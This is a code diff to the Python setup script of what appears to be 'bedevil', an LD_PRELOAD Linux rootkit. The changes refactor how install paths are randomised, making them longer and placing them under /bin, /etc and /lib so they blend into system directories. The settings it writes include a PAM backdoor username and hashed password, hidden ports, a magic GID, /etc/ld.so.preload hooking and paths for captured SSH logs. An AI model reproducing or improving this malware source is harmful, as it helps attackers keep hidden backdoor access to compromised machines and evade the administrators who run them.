@@ -162,9 +162,6 @@ valid_platforms = ['x86_64', 'i686', 'v6l', 'v7l']
 # are dropped, in order, if it exists. regardless of the root user's real login shell. or lack thereof.
 goodshells = ['/bin/bash', '/bin/sh']
 
-# the root directories of where our stuff will reside. see Util.randpath.
-rootdirs = ['/opt', '/bin', '/etc', '/lib']
-
 
 
 
@@ -177,6 +174,7 @@ from os import listdir, system, unlink, mkdir
 from os.path import basename, isdir
 from binascii import hexlify
 
+alowercase, auppercase = ascii_lowercase, ascii_uppercase
 
 class Hooks():
     def __init__(self):
@@ -322,15 +320,18 @@ class Util():
     def __init__(self):
         self.usedpaths = []
 
+        # the root directories of where our stuff will reside. see Util.randpath.
+        self.rootdirs = ['/bin', '/etc', '/lib']
+
     # hex the contents of a path & return it as a char array.
-    def hexarraylifypath(self, path, arrname, arrtype='char'):
+    def hexarraylifypath(self, path, arrname):
         fd = open(path, 'rb')
         contents = fd.read()
         fd.close()
 
         contentshex = hexlify(contents)
         contentslist = ['0x'+str(contentshex[i:i+2].decode('utf-8')) for i in range(0, len(contentshex), 2)]
-        contentsarr = CArray(arrname, contentslist, arrtype=arrtype)
+        contentsarr = CArray(arrname, contentslist, arrtype='char')
         return contentsarr.create()
 
     def sogetpath(self, instdir, soname):
@@ -353,29 +354,40 @@ class Util():
         return rports
 
     def cryptpw(self, plain):
-        salt = self.randgarb(ascii_uppercase+ascii_lowercase+digits, 16)
+        salt = self.randgarb(auppercase+alowercase+digits, 16)
         hashd = crypt(plain, "$6$"+salt)
         return hashd
 
+    def getpathroot(self):
+        basedirs = self.rootdirs
+        randroot = choice(basedirs)
+        if not isdir(randroot):
+            return self.getpathroot()
+
+        dirlist = listdir(randroot)
+        if(len(dirlist) == 0):
+            return self.getpathroot()
+
+        randdir = choice(dirlist)
+        return randroot+'/'+randdir
+
     def randpath(self, maxlen):
-        randroot = choice(rootdirs)
-        randdir = choice(listdir(randroot))
+        randdir = self.getpathroot()
 
         while len(randdir) < maxlen:
-            randdir += self.randgarb(ascii_lowercase, 1)
+            randdir += self.randgarb(alowercase, 1)
 
         while len(randdir) > maxlen:
             randdir = randdir[:-1]
 
-        suffix = self.randgarb(ascii_lowercase, 3)
-        newpath = '{0}/{1}{2}'.format(randroot, randdir, suffix)
+        randdir = randdir[:-1] + self.randgarb(alowercase, 1)
 
-        if newpath in self.usedpaths or '.' in newpath:
-            newpath = self.randpath(maxlen)
+        if randdir in self.usedpaths or '.' in randdir:
+            randdir = self.randpath(maxlen)
         else:
-            self.usedpaths.append(newpath)
+            self.usedpaths.append(randdir)
 
-        return newpath
+        return randdir
 
 
 
@@ -383,8 +395,8 @@ class Util():
 # bunch of settings related stuff...
 ut, m = Util(), Magical()
 
-PAM_UNAME = ut.randgarb(ascii_lowercase, 7) if PAM_UNAME == None else PAM_UNAME
-BACKDOOR_PASS = ut.randgarb(ascii_lowercase+ascii_uppercase+digits, 8) if BACKDOOR_PASS == None else BACKDOOR_PASS
+PAM_UNAME = ut.randgarb(alowercase, 7) if PAM_UNAME == None else PAM_UNAME
+BACKDOOR_PASS = ut.randgarb(alowercase+auppercase+digits, 8) if BACKDOOR_PASS == None else BACKDOOR_PASS
 ACCEPT_PORT = ut.randport() if ACCEPT_PORT == None and USE_ACCEPT_BD == True else ACCEPT_PORT
 
 if NUM_HIDDEN_PORTS <= 0 and len(CUSTOM_PORTS) == 0:
@@ -398,9 +410,9 @@ if USE_ACCEPT_BD == True: BDVLPORTS.insert(0, ACCEPT_PORT)
 
 MAX_GID, MIN_GID = m.magicmax(), m.magicmin()
 MAGIC_GID = m.maGicalID()
-INSTALL_DIR = ut.randpath(7)
+INSTALL_DIR = ut.randpath(14)
 BDVLSO = ut.sogetname(INSTALL_DIR)
-CLEANEDTIME_PATH = ut.randpath(7) if not FILE_CLEANSE_TIMER == None else None
+CLEANEDTIME_PATH = ut.randpath(12) if not FILE_CLEANSE_TIMER == None else None
 
 INC, NEW_INC = 'inc', 'new_inc'
 CONFIGH      = NEW_INC + '/config.h'
@@ -410,14 +422,14 @@ SETTINGS_CFG = NEW_INC + '/settings.cfg'      # auto.sh reads BDVLSO from here.
 BDVLH = NEW_INC + '/bedevil.h'
 SETTINGS = { # all of these are written to bedevil.h. if a value is None it is skipped.
     'PAM_UNAME':PAM_UNAME,                   'BACKDOOR_PASS':ut.cryptpw(BACKDOOR_PASS),
-    'MAGIC_GID':MAGIC_GID,                   'BD_VAR':ut.randgarb(ascii_uppercase, 16),
-    'INSTALL_DIR':INSTALL_DIR,               'HOMEDIR':ut.randpath(4),
+    'MAGIC_GID':MAGIC_GID,                   'BD_VAR':ut.randgarb(auppercase, 16),
+    'INSTALL_DIR':INSTALL_DIR,               'HOMEDIR':ut.randpath(17),
     'BDVLSO':BDVLSO,                         'SOPATH':ut.sogetpath(INSTALL_DIR, BDVLSO),
-    'PRELOAD_FILE':ut.randpath(10),          'SSH_LOGS':ut.randpath(6),
-    'INTEREST_DIR':ut.randpath(7),           'HIDEPORTS':ut.randpath(7),
-    'GID_PATH':ut.randpath(5),               'GIDTIME_PATH':ut.randpath(5),
-    'SSHD_CONFIG':'/etc/ssh/sshd_config',    'LOG_PATH':ut.randpath(8),
-    'ASS_PATH':ut.randpath(7),               'MAX_FILE_SIZE':MAX_FILE_SIZE,
+    'PRELOAD_FILE':ut.randpath(18),          'SSH_LOGS':ut.randpath(14),
+    'INTEREST_DIR':ut.randpath(17),          'HIDEPORTS':ut.randpath(17),
+    'GID_PATH':ut.randpath(15),              'GIDTIME_PATH':ut.randpath(16),
+    'SSHD_CONFIG':'/etc/ssh/sshd_config',    'LOG_PATH':ut.randpath(15),
+    'ASS_PATH':ut.randpath(16),              'MAX_FILE_SIZE':MAX_FILE_SIZE,
     'FILE_CLEANSE_TIMER':FILE_CLEANSE_TIMER, 'CLEANEDTIME_PATH':CLEANEDTIME_PATH,
     'OLD_PRELOAD':'/etc/ld.so.preload',      'BLOCKS_COUNT':BLOCKS_COUNT,
     'MAX_BLOCK_SIZE':MAX_BLOCK_SIZE,         'GID_CHANGE_MINTIME':GID_CHANGE_MINTIME,
@@ -425,7 +437,7 @@ SETTINGS = { # all of these are written to bedevil.h. if a value is None it is s
     'MAX_GID':MAX_GID,                       'MIN_GID':MIN_GID,
     'TARGET_INTERFACE':TARGET_INTERFACE,     'MAGIC_ID':MAGIC_ID,
     'MAGIC_SEQ':MAGIC_SEQ,                   'MAGIC_ACK':MAGIC_ACK,
-    'EXEC_LOGS':ut.randpath(4)
+    'EXEC_LOGS':ut.randpath(17)
 }
 
 # the following paths are linked to within the installation directory.
